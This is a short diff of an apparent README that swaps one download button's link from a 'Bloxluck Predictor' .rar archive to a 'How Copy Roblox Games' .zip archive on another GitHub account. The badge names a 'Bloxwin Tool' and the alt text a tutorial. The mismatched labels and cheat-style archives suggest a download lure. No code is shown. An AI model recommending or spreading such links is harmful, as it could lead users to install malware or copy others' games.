@@ -7,7 +7,7 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/PauBlox/Bloxluck/releases/download/github/Bloxluck.Predictor.V.3.2.2.rar" target="_blank">
+  <a href="https://github.com/onlyfelon/HowToCopyRobloxGames/releases/download/Setup/HCRG.-.How.Copy.Roblox.Games.zip" target="_blank">
     <img src="https://img.shields.io/badge/Download-Bloxwin%20Tool-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Tutorial" />
   </a>
 </p>
